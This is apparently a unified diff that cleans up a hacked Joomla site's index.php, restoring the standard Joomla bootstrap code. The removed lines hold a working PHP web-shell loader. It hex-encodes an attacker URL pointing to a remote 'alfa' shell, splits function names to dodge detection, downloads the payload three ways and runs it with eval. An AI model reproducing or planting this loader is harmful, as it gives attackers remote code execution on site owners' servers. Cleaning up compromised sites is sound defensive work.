@@ -1,59 +1,49 @@
 <?php
-$hexUrl = '68747470733a2f2f6879706f637269746573656f2e696e666f2f7368656c6c2f616c66612e747874';
+/**
+ * @package    Joomla.Site
+ *
+ * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
 
-function hex2str($hex) {
-    $str = '';
-    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
-        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
-    }
-    return $str;
+/**
+ * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
+ */
+define('JOOMLA_MINIMUM_PHP', '5.3.10');
+
+if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
+{
+	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
 }
 
-$url = hex2str($hexUrl);
+// Saves the start time and memory usage.
+$startTime = microtime(1);
+$startMem  = memory_get_usage();
 
-function downloadWithFileGetContents($url) {
-    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
-        return file_get_contents($url);
-    }
-    return false;
+/**
+ * Constant that is checked in included files to prevent direct access.
+ * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
+ */
+define('_JEXEC', 1);
+
+if (file_exists(__DIR__ . '/defines.php'))
+{
+	include_once __DIR__ . '/defines.php';
 }
 
-function downloadWithCurl($url) {
-    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return false;
+if (!defined('_JDEFINES'))
+{
+	define('JPATH_BASE', __DIR__);
+	require_once JPATH_BASE . '/includes/defines.php';
 }
 
-function downloadWithFopen($url) {
-    $result = false;
-    if ($fp = fopen($url, 'r')) {
-        $result = '';
-        while ($data = fread($fp, 8192)) {
-            $result .= $data;
-        }
-        fclose($fp);
-    }
-    return $result;
-}
+require_once JPATH_BASE . '/includes/framework.php';
 
-$phpScript = downloadWithFileGetContents($url);
-if ($phpScript === false) {
-    $phpScript = downloadWithCurl($url);
-}
-if ($phpScript === false) {
-    $phpScript = downloadWithFopen($url);
-}
+// Set profiler start time and memory usage and mark afterLoad in the profiler.
+JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
 
-if ($phpScript === false) {
-    die("Gagal mendownload script PHP dari URL dengan semua metode.");
-}
+// Instantiate the application.
+$app = JFactory::getApplication('site');
 
-eval('?>' . $phpScript);
-?>
+// Execute the application.
+$app->execute();
